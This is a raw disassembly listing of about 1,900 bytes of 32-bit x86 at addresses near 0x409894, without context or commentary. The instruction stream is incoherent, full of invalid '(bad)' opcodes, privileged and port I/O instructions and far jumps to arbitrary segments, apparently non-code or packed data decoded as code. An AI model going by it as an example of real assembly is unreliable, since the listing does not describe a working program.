  409894:	repnz fidivr WORD PTR [ecx-0x5]
  409898:	push   ds
  409899:	bound  ebp,QWORD PTR [ecx-0x27]
  40989c:	aad    0x25
  40989e:	and    al,0x5
  4098a0:	push   0xffffff97
  4098a2:	sar    BYTE PTR [edx+0x7560efc1],1
  4098a8:	adc    ch,dl
  4098aa:	adc    BYTE PTR ds:0x1d097c2c,bh
  4098b0:	sbb    edx,DWORD PTR [esi-0x1ebf9aaf]
  4098b6:	add    eax,0xb7d61451
  4098bb:	sbb    dl,ah
  4098bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098be:	sti    
  4098bf:	add    ebx,DWORD PTR [ebx+0x696a2ee7]
  4098c5:	std    
  4098c6:	(bad)  
  4098c7:	mov    edi,0x9284611d
  4098cc:	mov    ds:0xff20fbbb,eax
  4098d1:	out    dx,eax
  4098d2:	(bad)  
  4098d3:	pop    edx
  4098d4:	dec    esi
  4098d5:	leave  
  4098d6:	ins    BYTE PTR es:[edi],dx
  4098d7:	popf   
  4098d8:	push   esi
  4098d9:	fadd   QWORD PTR [ecx-0x5b]
  4098dc:	push   ebx
  4098dd:	mov    eax,ds:0x4a874932
  4098e2:	shl    DWORD PTR cs:[edx+0xb2173a1],1
  4098e9:	jmp    0xf855:0x1142d05f
  4098f0:	xchg   edi,eax
  4098f1:	dec    ecx
  4098f2:	jo     0x409909
  4098f4:	stc    
  4098f5:	mov    ds:0x310c740,al
  4098fa:	and    eax,0x6580d574
  4098ff:	xchg   ebx,eax
  409900:	jg     0x409931
  409902:	daa    
  409903:	dec    ebx
  409904:	lahf   
  409905:	imul   ecx,ebp,0xe5bd23a3
  40990b:	pop    eax
  40990c:	jb     0x409989
  40990e:	pushf  
  40990f:	inc    ebp
  409910:	inc    eax
  409911:	jo     0x409944
  409913:	scas   al,BYTE PTR es:[edi]
  409914:	cmc    
  409915:	add    BYTE PTR [ebp*8+0x2357cb36],bh
  40991c:	sub    bl,BYTE PTR gs:[esi-0x9]
  409920:	lock je 0x4098ad
  409923:	in     al,dx
  409924:	push   ebp
  409925:	data16 ss std 
  409928:	lods   eax,DWORD PTR ds:[esi]
  409929:	sub    eax,0xa0ee5006
  40992e:	sub    ch,BYTE PTR [ebx-0x548b7ca9]
  409934:	mov    esi,0xfbb626ba
  409939:	sbb    BYTE PTR [ecx+0x51],0xfb
  40993d:	sti    
  40993e:	xchg   ebp,eax
  40993f:	hlt    
  409940:	push   DWORD PTR [ebx+0x71849175]
  409946:	shl    BYTE PTR [ebx-0xc],cl
  409949:	inc    esi
  40994a:	push   ebp
  40994b:	mov    dh,0x39
  40994d:	inc    edi
  40994e:	mov    WORD PTR [edi+0x1],gs
  409951:	dec    ecx
  409952:	into   
  409953:	push   ds
  409954:	xor    esp,esi
  409956:	enter  0xf4e1,0xcd
  40995a:	xor    al,0x10
  40995c:	mov    bh,0xc5
  40995e:	inc    dx
  409960:	jo     0x4098f4
  409962:	jnp    0x4099d3
  409964:	jmp    0x4098f9
  409966:	ficom  WORD PTR [ecx-0x3a]
  409969:	cli    
  40996a:	adc    edx,ebx
  40996c:	and    ebx,DWORD PTR [esi+eax*8+0xb]
  409970:	adc    cl,bl
  409972:	pop    eax
  409973:	popf   
  409974:	mov    cl,0xcc
  409976:	aam    0xd0
  409978:	cmp    DWORD PTR [edi+0x39],0x4d
  40997c:	sub    al,BYTE PTR [edx]
  40997e:	mov    al,ds:0xbbecad34
  409983:	fdiv   QWORD PTR [ebp-0x6e52bfef]
  409989:	(bad)  
  40998a:	mov    BYTE PTR [ecx+ebp*8-0x56],ah
  40998e:	call   0xa2327772
  409993:	mov    ecx,0x6dd31387
  409998:	sub    ebp,ebx
  40999a:	test   BYTE PTR [ebx-0x11a22288],ah
  4099a0:	push   ss
  4099a1:	push   eax
  4099a2:	les    edi,FWORD PTR [edx-0x23ca2f23]
  4099a8:	xlat   BYTE PTR ds:[ebx]
  4099a9:	mov    ds,WORD PTR [ebp-0x3f]
  4099ac:	xchg   ecx,eax
  4099ad:	mov    ebp,0x9bf039dd
  4099b2:	jbe    0x409a0e
  4099b4:	pusha  
  4099b5:	pop    es
  4099b6:	pop    ebp
  4099b7:	out    dx,al
  4099b8:	jns    0x409a31
  4099ba:	push   edi
  4099bb:	test   BYTE PTR [edi],0x7c
  4099be:	mov    ebx,0xd3195777
  4099c3:	dec    edx
  4099c4:	mov    ecx,0xf517be0a
  4099c9:	inc    eax
  4099ca:	int    0x25
  4099cc:	or     eax,0x67001b45
  4099d1:	add    esi,DWORD PTR [eax+eax*2]
  4099d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099d5:	outs   dx,DWORD PTR ds:[esi]
  4099d6:	jno    0x4099c2
  4099d8:	fst    st(0)
  4099da:	das    
  4099db:	(bad)  
  4099dd:	fidivr WORD PTR [eax]
  4099df:	or     al,0x86
  4099e1:	fcom   DWORD PTR [ebp+0x7e]
  4099e4:	fisubr DWORD PTR [eax+0x4ab309e5]
  4099ea:	xchg   esi,eax
  4099eb:	repnz cdq 
  4099ed:	xor    esi,DWORD PTR [esi+eax*2]
  4099f0:	and    DWORD PTR [eax+0x2d],ecx
  4099f3:	pusha  
  4099f4:	(bad)  
  4099f5:	or     BYTE PTR [ecx+0x3f1a90dc],ch
  4099fb:	mov    al,ah
  4099fd:	test   dh,ah
  4099ff:	cmp    al,0x3f
  409a01:	or     ebx,esi
  409a03:	neg    DWORD PTR [esi]
  409a05:	and    eax,0x810ac473
  409a0a:	jb     0x4099f8
  409a0c:	fistp  QWORD PTR ds:0x709561c1
  409a12:	mov    DWORD PTR [ecx+0x25],0xe7ee756c
  409a19:	test   DWORD PTR [eax+0x1b],edi
  409a1c:	lahf   
  409a1d:	sub    DWORD PTR [edi+esi*2+0x44],esi
  409a21:	(bad)  [esi-0x4c61a96f]
  409a27:	pop    edi
  409a28:	dec    esp
  409a29:	scas   eax,DWORD PTR es:[edi]
  409a2a:	cli    
  409a2b:	aaa    
  409a2c:	mov    edx,0xb743c4d5
  409a31:	imul   ecx,esi,0xffffffa5
  409a34:	mov    es,eax
  409a36:	test   al,0xc9
  409a38:	adc    eax,0xdac9e98
  409a3d:	pop    eax
  409a3e:	jne    0x409a29
  409a40:	adc    al,0x13
  409a42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a43:	das    
  409a44:	shl    edx,cl
  409a46:	sub    edi,0xa5c1939
  409a4c:	adc    DWORD PTR ds:0x252b3ee7,esi
  409a52:	jmp    0x409a95
  409a54:	in     eax,dx
  409a55:	gs js  0x409a24
  409a58:	or     bl,BYTE PTR [esi-0x59]
  409a5b:	xchg   ecx,eax
  409a5c:	sbb    BYTE PTR [edi+0x38],bh
  409a5f:	(bad)  
  409a60:	mov    WORD PTR [edi-0x4ccea0b0],cs
  409a66:	cli    
  409a67:	daa    
  409a68:	xchg   ebp,eax
  409a69:	in     eax,0xc8
  409a6b:	sub    al,0x15
  409a6d:	pop    eax
  409a6e:	punpcklbw mm4,mm6
  409a71:	jp     0x4099f6
  409a73:	xchg   esi,eax
  409a74:	cmp    al,BYTE PTR [ecx+ebx*1+0x73]
  409a78:	rol    DWORD PTR [esi],1
  409a7a:	retf   
  409a7b:	dec    eax
  409a7c:	fnsave [ebx-0x3eaef142]
  409a82:	push   ebx
  409a83:	xchg   edx,eax
  409a84:	dec    esp
  409a85:	fldenv [ebx]
  409a87:	stos   DWORD PTR es:[edi],eax
  409a88:	inc    ebx
  409a89:	dec    eax
  409a8a:	mov    ds:0xbfe33ed8,al
  409a8f:	push   ds
  409a90:	inc    ebp
  409a91:	int    0xab
  409a93:	movsx  ecx,sp
  409a96:	int3   
  409a97:	and    bh,BYTE PTR [ecx]
  409a99:	mov    DWORD PTR [esi-0x259383f7],edi
  409a9f:	inc    ecx
  409aa0:	push   ecx
  409aa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409aa2:	loope  0x409a77
  409aa4:	sti    
  409aa5:	add    al,0x78
  409aa7:	dec    edx
  409aa8:	(bad)  
  409aa9:	scas   al,BYTE PTR es:[edi]
  409aaa:	into   
  409aab:	sub    ecx,DWORD PTR [ebp+ebx*1+0x68f97adb]
  409ab2:	(bad)  
  409ab3:	fild   DWORD PTR [eax+ebp*8+0x7b]
  409ab7:	scas   eax,DWORD PTR es:[edi]
  409ab8:	push   es
  409ab9:	sar    BYTE PTR [edx+0x1488aa39],1
  409abf:	mov    ebp,0xf0cb452d
  409ac4:	pop    eax
  409ac5:	push   esp
  409ac6:	xor    BYTE PTR [ebp-0x1d3e876d],dl
  409acc:	and    BYTE PTR [edx],cl
  409ace:	xchg   edx,eax
  409acf:	aam    0xd8
  409ad1:	adc    eax,0xd1e26b6d
  409ad6:	jbe    0x409a9a
  409ad8:	out    0x29,eax
  409ada:	xchg   DWORD PTR [ebp+0x34],eax
  409add:	outs   dx,DWORD PTR ds:[esi]
  409ade:	fs cld 
  409ae0:	jmp    0x409a6f
  409ae2:	pop    ecx
  409ae3:	aas    
  409ae4:	int    0xfd
  409ae6:	pusha  
  409ae7:	clc    
  409ae8:	dec    ebp
  409ae9:	fs cmc 
  409aeb:	shl    DWORD PTR [edi+0x71],cl
  409aee:	pop    es
  409aef:	repnz ins DWORD PTR es:[edi],dx
  409af1:	jmp    0x200a:0x5d9cd686
  409af8:	xchg   ebx,eax
  409af9:	mov    bh,0x23
  409afb:	sbb    DWORD PTR [ecx+0x5a],ebx
  409afe:	iret   
  409aff:	xlat   BYTE PTR ds:[ebx]
  409b00:	mov    ebx,DWORD PTR [ebp+0xb]
  409b03:	adc    ch,BYTE PTR [eax]
  409b05:	call   0x871e:0xb8ddbb76
  409b0c:	mov    ebp,DWORD PTR [esi-0x50]
  409b0f:	es xor al,0xb5
  409b12:	add    esp,ebp
  409b14:	lods   al,BYTE PTR ds:[esi]
  409b15:	sbb    BYTE PTR [eax+0x202afe37],ch
  409b1b:	cmp    DWORD PTR [ebx],0xa65c8144
  409b21:	dec    ebx
  409b22:	outs   dx,DWORD PTR ds:[esi]
  409b23:	push   es
  409b24:	add    eax,0x2fd30970
  409b29:	mov    dh,0xa4
  409b2b:	mov    eax,ds:0x85d301d3
  409b30:	mov    ah,dh
  409b32:	in     eax,0xfc
  409b34:	jp     0x409b65
  409b36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b37:	sbb    edi,DWORD PTR [edi+edx*2]
  409b3a:	in     eax,0xff
  409b3c:	cmp    BYTE PTR [ecx],dl
  409b3e:	scas   al,BYTE PTR es:[edi]
  409b3f:	shl    dh,cl
  409b41:	adc    cl,BYTE PTR [edx+0x463a9219]
  409b47:	fisttp DWORD PTR [edx-0x5e]
  409b4a:	pop    ds
  409b4b:	(bad)  
  409b4c:	and    al,bl
  409b4e:	(bad)  
  409b4f:	in     al,dx
  409b50:	fbld   TBYTE PTR [ebp-0x3e8f82e3]
  409b56:	sub    eax,0x4c0e2ab5
  409b5b:	addr16 mov ch,0x31
  409b5e:	shl    esi,0xb1
  409b61:	mov    dh,0xba
  409b63:	sbb    BYTE PTR [eax],0xb6
  409b66:	cmp    eax,DWORD PTR [ebp+eax*2+0x6f]
  409b6a:	or     DWORD PTR ss:[ecx+0x23],edi
  409b6e:	stos   DWORD PTR es:[edi],eax
  409b6f:	push   es
  409b70:	dec    eax
  409b71:	test   eax,0x25babd5
  409b76:	mov    dl,BYTE PTR [edx]
  409b78:	cwde   
  409b79:	add    eax,DWORD PTR [ebx+eax*8]
  409b7c:	pop    ds
  409b7d:	and    edi,DWORD PTR [ecx]
  409b7f:	jecxz  0x409b6d
  409b81:	xchg   esp,eax
  409b82:	cdq    
  409b83:	cld    
  409b84:	fidivr DWORD PTR [edi]
  409b86:	inc    esi
  409b87:	es sti 
  409b89:	or     eax,DWORD PTR [eax]
  409b8b:	repnz outs dx,DWORD PTR ds:[esi]
  409b8d:	dec    esp
  409b8e:	ss pop edx
  409b90:	jns    0x409b72
  409b92:	cmc    
  409b93:	jnp    0x409b5a
  409b95:	or     DWORD PTR [eax+0x3],esp
  409b98:	je     0x409be0
  409b9a:	and    al,0xe4
  409b9c:	cmc    
  409b9d:	es dec ebp
  409b9f:	pop    ebp
  409ba0:	in     eax,0xd4
  409ba2:	loope  0x409bf6
  409ba4:	out    0x44,al
  409ba6:	sbb    DWORD PTR [ebp-0x3a],eax
  409ba9:	data16 mov ah,0x5c
  409bac:	xor    eax,DWORD PTR [ecx]
  409bae:	dec    edx
  409baf:	inc    edi
  409bb0:	xchg   ecx,eax
  409bb1:	mov    esp,0xb33e9687
  409bb6:	mov    ecx,0xbb146185
  409bbb:	add    BYTE PTR [edi+0x4c],al
  409bbe:	imul   ebp,edx,0x840f63ca
  409bc4:	adc    ecx,DWORD PTR [ebp-0x26]
  409bc7:	pop    ss
  409bc8:	or     al,0x69
  409bca:	or     BYTE PTR [edi+ebp*2-0x27],cl
  409bce:	dec    ebx
  409bcf:	sub    esi,edx
  409bd1:	sbb    dl,BYTE PTR [eax+0x2d4a7b22]
  409bd7:	inc    ecx
  409bd8:	sbb    eax,DWORD PTR [ecx+0x5ab8466e]
  409bde:	jmp    0x409b7a
  409be0:	ins    DWORD PTR es:[edi],dx
  409be1:	repnz mov dh,0x57
  409be4:	(bad)
  409be7:	mov    ecx,0x1b434391
  409bec:	add    eax,0xad02412
  409bf1:	hlt    
  409bf2:	or     DWORD PTR [ecx+0x65ba7a8d],edi
  409bf8:	leave  
  409bf9:	pop    ecx
  409bfa:	mov    esi,0xd75eea7c
  409bff:	inc    ebx
  409c00:	cwde   
  409c01:	push   es
  409c02:	iret   
  409c03:	mov    cl,0x48
  409c05:	lea    esi,[eax+0x77]
  409c08:	pop    ecx
  409c09:	popf   
  409c0a:	inc    ecx
  409c0b:	mov    cl,0xd1
  409c0d:	push   0xd2b69681
  409c12:	sbb    eax,0xe2876ed3
  409c17:	(bad)  
  409c18:	scas   al,BYTE PTR es:[edi]
  409c19:	mov    ch,0x5e
  409c1b:	sub    DWORD PTR [edi],edi
  409c1d:	fist   DWORD PTR [edi+0x16f3e379]
  409c23:	shl    DWORD PTR [ecx-0x80],0x6e
  409c27:	into   
  409c28:	inc    ebp
  409c29:	inc    ebp
  409c2a:	and    eax,0x5d54634a
  409c2f:	dec    edi
  409c30:	addr16 addr16 out dx,eax
  409c33:	loopne 0x409cb3
  409c35:	lods   eax,DWORD PTR ds:[esi]
  409c36:	pop    esp
  409c37:	pop    edx
  409c38:	jnp    0x409c40
  409c3a:	adc    al,0x22
  409c3c:	iret   
  409c3d:	adc    ebp,ebx
  409c3f:	stos   DWORD PTR es:[edi],eax
  409c40:	adc    BYTE PTR [ebp+0x561b419e],dl
  409c46:	aaa    
  409c47:	mov    dh,0x7e
  409c49:	popf   
  409c4a:	mov    al,ds:0x626df5d
  409c4f:	pop    esi
  409c50:	mov    edi,0xab304507
  409c55:	jecxz  0x409cb9
  409c57:	push   0x4281517
  409c5c:	pop    es
  409c5d:	or     al,0xb9
  409c5f:	sahf   
  409c60:	mov    ebp,0xf3000ee4
  409c65:	fsub   QWORD PTR [edx+ebp*1+0x38]
  409c69:	push   es
  409c6a:	sahf   
  409c6b:	sub    esp,DWORD PTR [edi+0x5bfcf0cb]
  409c71:	fidivr WORD PTR [eax-0x2f34cf33]
  409c77:	imul   eax,ebx,0xb792a41c
  409c7d:	loopne 0x409c4a
  409c7f:	fisubr WORD PTR [esi]
  409c81:	fsub   QWORD PTR [edx]
  409c83:	loop   0x409c1c
  409c85:	mov    al,ds:0xcddf7694
  409c8a:	popf   
  409c8b:	mov    esi,0x6ead5bc7
  409c90:	jp     0x409c32
  409c92:	outs   dx,BYTE PTR ds:[esi]
  409c93:	xor    BYTE PTR [eax],dh
  409c95:	sbb    DWORD PTR [edi-0x29],edx
  409c98:	dec    edx
  409c99:	mov    fs,WORD PTR [esi+0x193bce39]
  409c9f:	or     DWORD PTR [ecx+eiz*1-0x1721354f],esi
  409ca6:	(bad)  
  409ca7:	fwait
  409ca8:	daa    
  409ca9:	pop    ebp
  409caa:	mov    cl,0xd
  409cac:	fisubr DWORD PTR [edi]
  409cae:	xor    BYTE PTR [ebp-0x2247ae5e],ah
  409cb4:	shr    DWORD PTR [ebp+0x49da280c],1
  409cba:	add    al,0x96
  409cbc:	scas   eax,DWORD PTR es:[edi]
  409cbd:	dec    ebx
  409cbe:	mov    BYTE PTR [ebx-0x4e217370],bl
  409cc4:	repnz pop edi
  409cc6:	je     0x409ce4
  409cc8:	cmp    eax,0x9a42c23d
  409ccd:	retf   0x3b24
  409cd0:	mov    ebx,0x6d4a55a2
  409cd5:	mov    eax,ds:0x3206b56d
  409cda:	lahf   
  409cdb:	fstp   DWORD PTR [edi+ebp*8-0x7fbdd14]
  409ce2:	clc    
  409ce3:	aad    0x87
  409ce5:	inc    edi
  409ce6:	cli    
  409ce7:	push   esi
  409ce8:	scas   eax,DWORD PTR es:[edi]
  409ce9:	out    0xaa,al
  409ceb:	xor    eax,0xf9a412fd
  409cf0:	cmp    cl,BYTE PTR [ebp+0x0]
  409cf3:	mov    al,0xf0
  409cf5:	pushf  
  409cf6:	inc    eax
  409cf7:	or     al,0x36
  409cf9:	dec    ebp
  409cfa:	mov    ebx,0x451ae284
  409cff:	dec    eax
  409d00:	rol    BYTE PTR [esi-0x5daa93a],0xfa
  409d07:	daa    
  409d08:	push   cs
  409d09:	jne    0x409ca5
  409d0b:	fiadd  WORD PTR [eax-0x19d5293a]
  409d11:	fisubr DWORD PTR fs:[esi]
  409d14:	pop    eax
  409d15:	xchg   BYTE PTR [ecx+0x1777ed7],ch
  409d1b:	push   edx
  409d1c:	xchg   esi,eax
  409d1d:	mov    dh,0x8
  409d1f:	scas   al,BYTE PTR es:[edi]
  409d20:	jb     0x409d4a
  409d22:	jmp    0x409d9b
  409d24:	pushf  
  409d25:	ret    
  409d26:	retf   
  409d27:	jno    0x409d86
  409d29:	repz adc DWORD PTR [edi],0x3c
  409d2d:	out    dx,al
  409d2e:	cmc    
  409d2f:	jmp    0xf401:0xbcc60a44
  409d36:	jecxz  0x409d4c
  409d38:	scas   eax,DWORD PTR es:[edi]
  409d39:	outs   dx,BYTE PTR ds:[esi]
  409d3a:	mov    ah,0x3a
  409d3c:	in     al,0x22
  409d3e:	cmp    ebx,DWORD PTR [ecx]
  409d40:	add    eax,0x7016e91
  409d45:	cmp    ebx,DWORD PTR ss:[ebp-0x54781f85]
  409d4c:	es jbe 0x409d9a
  409d4f:	fmul   st(0),st
  409d51:	cmp    BYTE PTR [esi],dh
  409d53:	int3   
  409d54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d55:	ins    BYTE PTR es:[edi],dx
  409d56:	cld    
  409d57:	pop    edi
  409d58:	ds and eax,0xbe281f4a
  409d5e:	in     al,dx
  409d5f:	sbb    eax,0x49344dde
  409d64:	outs   dx,DWORD PTR ds:[esi]
  409d65:	and    cl,cl
  409d67:	xchg   esi,eax
  409d68:	jbe    0x409d7e
  409d6a:	(bad)  [esi+ebx*4+0x4b6fcda7]
  409d71:	add    BYTE PTR [ebx+0x3dc621af],al
  409d77:	cdq    
  409d78:	call   0x84e5:0xcb5770e7
  409d7f:	sub    eax,0x9a3ff3a6
  409d84:	push   0xbd544b92
  409d89:	and    al,0x17
  409d8b:	aaa    
  409d8c:	popa   
  409d8d:	div    DWORD PTR [ecx+0x0]
  409d90:	adc    BYTE PTR [ecx],bl
  409d92:	push   ebx
  409d93:	and    DWORD PTR [esi+ebx*1],ecx
  409d96:	mov    eax,0x5a031df8
  409d9b:	and    dh,dh
  409d9d:	loop   0x409dcc
  409d9f:	push   cs
  409da0:	xchg   ecx,eax
  409da1:	dec    ecx
  409da2:	and    BYTE PTR [esi],ah
  409da4:	popa   
  409da5:	dec    ebp
  409da6:	clc    
  409da7:	mov    BYTE PTR [ebx],dh
  409da9:	call   FWORD PTR [edi+0x7b385a34]
  409daf:	jmp    0x30b220c0
  409db4:	clc    
  409db5:	xor    BYTE PTR [edx-0x5679a068],ch
  409dbb:	pusha  
  409dbc:	pusha  
  409dbd:	inc    edi
  409dbe:	and    ebp,0xffffff9b
  409dc1:	add    ebp,DWORD PTR [eax+0x3c]
  409dc4:	es pusha 
  409dc6:	mov    cl,0x8b
  409dc8:	xor    DWORD PTR [ebx-0x24],edi
  409dcb:	mov    eax,0xac93c13a
  409dd0:	mov    esi,0x4a26ef83
  409dd5:	sub    esi,DWORD PTR [ebx+0x4128eae9]
  409ddb:	lahf   
  409ddc:	add    cl,BYTE PTR ds:0x4d754a3d
  409de2:	pop    ebx
  409de3:	hlt    
  409de4:	pop    ss
  409de5:	fs dec eax
  409de7:	xchg   esi,eax
  409de8:	adc    BYTE PTR [eax+0x26],0xe3
  409dec:	scas   al,BYTE PTR es:[edi]
  409ded:	sbb    eax,0xb7ce5efe
  409df2:	test   bl,dl
  409df4:	mov    al,ds:0xb926321a
  409df9:	mov    bl,0x14
  409dfb:	jne    0x409e24
  409dfd:	mov    ah,ah
  409dff:	out    dx,eax
  409e00:	fist   DWORD PTR [eax]
  409e02:	retf   
  409e03:	adc    bh,BYTE PTR [ebx]
  409e05:	call   0x3f65:0xfad5420b
  409e0c:	adc    bl,cl
  409e0e:	sub    edi,edi
  409e10:	test   dh,0xb9
  409e13:	int    0x22
  409e15:	or     DWORD PTR [edx],edx
  409e17:	mov    dh,0x24
  409e19:	mov    dh,0xcd
  409e1b:	aam    0x1a
  409e1d:	icebp  
  409e1e:	dec    ebp
  409e1f:	(bad)  
  409e20:	outs   dx,DWORD PTR ds:[esi]
  409e21:	push   ebx
  409e22:	jb     0x409db0
  409e24:	ins    DWORD PTR es:[edi],dx
  409e25:	loop   0x409df6
  409e27:	jp     0x409dfb
  409e29:	mov    eax,ds:0x8b17354e
  409e2e:	mov    bl,0x7
  409e30:	mov    ah,0x9c
  409e32:	inc    eax
  409e33:	sub    cl,BYTE PTR [edi]
  409e35:	dec    esi
  409e36:	std    
  409e37:	fisttp DWORD PTR [edx-0x2d]
  409e3a:	mov    cl,dh
  409e3c:	adc    edi,DWORD PTR [ebx-0x7085b7bd]
  409e42:	jecxz  0x409e74
  409e44:	test   ecx,edx
  409e46:	xor    al,dh
  409e48:	daa    
  409e49:	sub    ebp,ebp
  409e4b:	sbb    eax,0x582e92e0
  409e50:	ss fcomip st,st(5)
  409e53:	imul   ebp,DWORD PTR [esi],0x47
  409e56:	push   cs
  409e57:	jo     0x409e8a
  409e59:	jmp    0x2bbf:0x2881fc2f
  409e60:	pop    edi
  409e61:	sbb    cl,al
  409e63:	push   0x5f73174c
  409e68:	add    BYTE PTR [ecx-0x456b09bd],cl
  409e6e:	mov    ebx,0x62786b01
  409e73:	add    eax,0xca6d620
  409e78:	xchg   ecx,eax
  409e79:	xor    dh,ah
  409e7b:	push   0xffffffac
  409e7d:	mov    ds,WORD PTR [ebp+0x3852bf55]
  409e83:	pushf  
  409e84:	stos   BYTE PTR es:[edi],al
  409e85:	xchg   ecx,eax
  409e86:	(bad)  
  409e87:	sbb    esp,eax
  409e89:	mov    edi,0xbedc123b
  409e8e:	dec    ebp
  409e8f:	adc    cl,BYTE PTR [edx]
  409e91:	or     eax,0xa404adb6
  409e96:	pop    esp
  409e97:	adc    bh,al
  409e99:	or     ecx,DWORD PTR [ebp-0x23bb1b78]
  409e9f:	cmp    al,0xb0
  409ea1:	push   ds
  409ea2:	mov    ds:0xb36f68b5,eax
  409ea7:	or     BYTE PTR [ebx],bh
  409ea9:	push   edx
  409eaa:	dec    DWORD PTR [edx-0x21]
  409ead:	jmp    0x409e6a
  409eaf:	js     0x409e61
  409eb1:	adc    BYTE PTR [ebx+0x47],dh
  409eb4:	mov    ecx,0x7003d49
  409eb9:	cli    
  409eba:	mov    eax,ds:0x17f982df
  409ebf:	jb     0x409ee2
  409ec1:	adc    ch,BYTE PTR [ecx]
  409ec3:	inc    edi
  409ec4:	push   eax
  409ec5:	xor    BYTE PTR [edi+0x51],dl
  409ec8:	arpl   WORD PTR [ecx+ebp*8],dx
  409ecb:	lods   eax,DWORD PTR ds:[esi]
  409ecc:	cmp    dl,dl
  409ece:	aas    
  409ecf:	cmp    BYTE PTR [ebx],bl
  409ed1:	stos   DWORD PTR es:[edi],eax
  409ed2:	nop
  409ed3:	xchg   esi,eax
  409ed4:	lods   al,BYTE PTR ds:[esi]
  409ed5:	xchg   DWORD PTR [ebp+0x14],edi
  409ed8:	cmp    al,0x2f
  409eda:	adc    al,bl
  409edc:	mov    esi,DWORD PTR [ecx]
  409ede:	adc    al,0x11
  409ee0:	push   cs
  409ee1:	or     esi,DWORD PTR [ebp-0x17fe5b6c]
  409ee7:	inc    edi
  409ee8:	addr16 pusha 
  409eea:	cmp    al,BYTE PTR [edx-0x65dcc556]
  409ef0:	loope  0x409f12
  409ef2:	mov    edx,0xde8028ec
  409ef7:	out    dx,al
  409ef8:	sub    al,0x0
  409efa:	adc    ebx,DWORD PTR [esi]
  409efc:	in     al,0xba
  409efe:	pop    eax
  409eff:	jmp    0x409f62
  409f01:	jo     0x409ed6
  409f03:	(bad)  
  409f04:	(bad)  
  409f06:	(bad)  
  409f07:	das    
  409f08:	ins    DWORD PTR es:[edi],dx
  409f09:	enter  0x7efb,0x5c
  409f0d:	push   ebx
  409f0e:	push   edx
  409f0f:	and    dh,ah
  409f11:	aam    0x2c
  409f13:	mov    bl,0xe1
  409f15:	cs dec ecx
  409f17:	imul   ebp,DWORD PTR [ecx+0x69],0xfffffffa
  409f1b:	jbe    0x409f64
  409f1d:	mov    ebp,0xf1b40563
  409f22:	xchg   BYTE PTR [ebx+edi*4+0x65],bl
  409f26:	and    ebx,ecx
  409f28:	sub    BYTE PTR [eax],cl
  409f2a:	mov    eax,0xc54c083d
  409f2f:	sub    eax,0xe5875efb
  409f34:	ins    DWORD PTR es:[edi],dx
  409f35:	xchg   esp,eax
  409f36:	add    al,0xe2
  409f38:	jmp    0x409ed3
  409f3a:	ret    
  409f3b:	push   0x1a9c2b3
  409f40:	call   0xd6d0:0x8b657738
  409f47:	fiadd  WORD PTR [edi+eiz*8]
  409f4a:	nop
  409f4b:	adc    BYTE PTR [edi+eax*2],al
  409f4e:	aaa    
  409f4f:	clc    
  409f50:	xchg   ecx,eax
  409f51:	ret    0x9243
  409f54:	ins    DWORD PTR es:[edi],dx
  409f55:	and    eax,0xb2d3e31
  409f5a:	daa    
  409f5b:	pop    esi
  409f5c:	push   ebp
  409f5d:	inc    esi
  409f5e:	(bad)  
  409f5f:	aad    0x87
  409f61:	sbb    DWORD PTR [edi+0x558a6fee],edi
  409f67:	mov    edi,0x8c90aa5b
  409f6c:	test   al,0x9a
  409f6e:	and    al,0x25
  409f70:	rol    BYTE PTR ds:0x1344adb4,1
  409f76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f77:	stos   DWORD PTR es:[edi],eax
  409f78:	xor    cl,ch
  409f7a:	xchg   DWORD PTR [ebp+0x1643c551],esp
  409f80:	mov    DWORD PTR [ecx+0x49c8b2c6],esi
  409f86:	dec    ebx
  409f87:	mov    esp,0x2c58001
  409f8c:	sub    eax,0xdef82be6
  409f91:	pop    esp
  409f92:	mov    DWORD PTR [ecx+ebx*1+0x2ab7825d],esi
  409f99:	or     DWORD PTR [eax],ebp
  409f9b:	push   cs
  409f9c:	xchg   ecx,eax
  409f9d:	pop    ss
  409f9e:	push   ebp
  409f9f:	adc    al,0x3e
  409fa1:	add    ebx,ebp
  409fa3:	dec    ebp
  409fa4:	sbb    eax,0x4ae3add1
  409fa9:	aam    0xdf
  409fab:	jae    0x409f52
  409fad:	scas   eax,DWORD PTR es:[edi]
  409fae:	cs inc eax
  409fb0:	js     0x409f51
  409fb2:	push   edx
  409fb3:	dec    ecx
  409fb4:	mov    cl,0x34
  409fb6:	inc    edi
  409fb7:	mov    ch,0xaf
  409fb9:	addr16 sti 
  409fbb:	mov    ah,0x4c
  409fbd:	neg    BYTE PTR [esi-0x6b85e32a]
  409fc3:	dec    ebp
  409fc4:	add    ch,BYTE PTR [ecx]
  409fc6:	aam    0x7c
  409fc8:	inc    eax
  409fc9:	imul   ebx
  409fcb:	into   
  409fcc:	xchg   esp,eax
  409fcd:	leave  
  409fce:	xchg   ecx,eax
  409fcf:	sbb    ebx,DWORD PTR [ebp-0x432f95fe]
  409fd5:	inc    esp
  409fd6:	or     al,0x78
  409fd8:	popf   
  409fd9:	sub    ecx,ebp
  409fdb:	popf   
  409fdc:	sbb    eax,0xb9467b17
  409fe1:	shl    DWORD PTR [ebx+0x28],0xe1
  409fe5:	out    0x8c,al
  409fe7:	aam    0x7e
  409fe9:	out    0xca,al
  409feb:	out    dx,eax
  409fec:	test   DWORD PTR [esi-0x6d6d08e1],esi
  409ff2:	adc    ebp,DWORD PTR [ebp+0x7d]
  409ff5:	in     eax,dx
  409ff6:	shl    BYTE PTR [esi+0x1c9c11f0],1
  409ffc:	dec    ebp
  409ffd:	xchg   ebp,eax
  409ffe:	jle    0x409fec
  40a000:	minps  xmm5,xmm1
  40a003:	push   ss
  40a004:	push   0x184656fb
  40a009:	adc    ebp,edx
  40a00b:	imul   ebp,esi,0x69
  40a00e:	in     eax,0xcf
  40a010:	into   
  40a011:	push   0xffffffcf
  40a013:	and    eax,0x74a1b316
  40a018:	mov    dl,0x21
  40a01a:	dec    esi
  40a01b:	mov    edx,DWORD PTR [edx]
  40a01d:	cmp    dh,BYTE PTR [edi]
  40a01f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a020:	jmp    0xcbcd:0xb5264b93
  40a027:	pop    es
  40a028:	or     DWORD PTR [edi-0x4c],ecx
  40a02b:	push   cs
  40a02c:	add    cl,al
  40a02e:	cdq    
